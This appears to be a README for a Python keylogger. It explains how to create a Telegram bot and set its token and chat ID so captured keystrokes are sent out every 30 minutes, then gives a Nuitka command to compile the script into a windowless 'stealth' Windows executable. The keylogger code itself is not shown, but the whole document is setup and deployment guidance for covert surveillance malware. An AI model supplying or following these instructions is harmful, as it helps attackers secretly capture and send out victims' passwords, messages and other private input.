## 🤖 Method 1: How to Create a Telegram Bot 

Follow these steps to create a Telegram bot and get your credentials.

### 1️⃣ Create a Telegram Bot via [BotFather](https://t.me/BotFather)

1. Open **Telegram** and search for [**@BotFather**](https://t.me/BotFather).
2. Start a chat with BotFather by typing `/start`.
3. Create a new bot by typing:
   ```
   /newbot
   ```
4. Follow the prompts:
   - Give your bot a name (e.g., `TestKeyloggerBot`).
   - Choose a username that ends with `bot` (e.g., `test_logger_bot`).

5. Once done, BotFather will provide you with a **bot token**:
   ```
   123456789:ABCdefGHIjklMNOpqrSTUvwxYZ
   ```

✅ **Copy this token** — it's your `TELEGRAM_BOT_TOKEN`.

---

### 2️⃣ Get Your Telegram Chat ID

1. Start a conversation with your bot by searching for its username and clicking **Start**.
2. Go to the following URL in your browser:
   ```
   https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates
   ```
   Replace `<YOUR_BOT_TOKEN>` with the token you received.

3. You’ll receive a response with the chat ID:
   ```json
   {
     "result": [
       {
         "message": {
           "chat": {
             "id": 123456789,
             "type": "private",
             ...
           }
         }
       }
     ]
   }
   ```

✅ **Copy this `id`** — it’s your `TELEGRAM_CHAT_ID`.

---

## 📁 Setup

1. Clone or download the repository.
2. Open `keylogger.py` and configure:

```python
TELEGRAM_BOT_TOKEN = "your_bot_token"
TELEGRAM_CHAT_ID = "your_chat_id"
LOG_INTERVAL = 1800  # Default is 30 minutes (1800 seconds)
```

3. Save the file.

---

## 🚀 Running the Script (For Testing)

To run the keylogger for testing purposes, execute the following command:

```bash
python keylogger.py
```

The script will begin logging and send updates to your Telegram bot at the configured interval.

---

## 🧙‍♂️ Compile to a Stealth `.exe` 

You can compile the script into a Windows `.exe` file using **Nuitka**.

Use this command to compile:

```powershell
& "$env:USERPROFILE\AppData\Roaming\Python\Python312\Scripts\nuitka.cmd" --standalone --onefile --windows-disable-console keylogger.py
```

The executable will be generated in the `keylogger` folder.
